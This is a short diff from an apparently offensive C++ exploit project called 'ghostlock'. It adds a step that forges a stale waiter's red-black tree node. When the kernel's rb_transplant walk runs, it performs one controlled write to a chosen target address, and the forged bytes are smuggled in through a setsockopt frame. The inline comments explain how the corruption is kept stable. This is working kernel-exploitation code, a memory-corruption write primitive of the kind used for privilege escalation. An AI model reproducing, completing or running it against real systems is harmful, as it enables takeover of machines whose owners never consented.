@@ -52,6 +52,26 @@ namespace ghostlock::route {
                        static_cast<size_t>(*layout.lock_offset), stamp_size);
             return status;
         }
+        /* W1 tree placement: forge the stale waiter's rb node so the walk's
+         * rb_transplant writes the page-derived value through target-8.
+         * task/lock keep their stale (real) values: the walk self-cycles on
+         * the waiter thread itself and stops after the single write. The
+         * spin loop below issues no syscalls, so the setsockopt frame that
+         * carries the forged bytes stays intact until the walk reads it. */
+        if (request && !memory::encode_multicast_w1_tree(
+                           {reinterpret_cast<std::byte *>(stamp), sizeof(stamp)},
+                           static_cast<size_t>(*layout.waiter_offset),
+                           request->target,
+                           session::g_exploit_session.heap.current.fake_lock + 0x100)) {
+            status.step = 62;
+            status.error_number = EOVERFLOW;
+            status.userspace_clean = 1;
+            status.kernel_disarmed = 1;
+            pr_warning("multicast W1 tree encode rejected (waiter_off=%zu)\n",
+                       static_cast<size_t>(*layout.waiter_offset));
+            return status;
+        }
+
         uint16_t family = AF_UNSPEC;
         memcpy(stamp + 8, &family, sizeof(family));
 
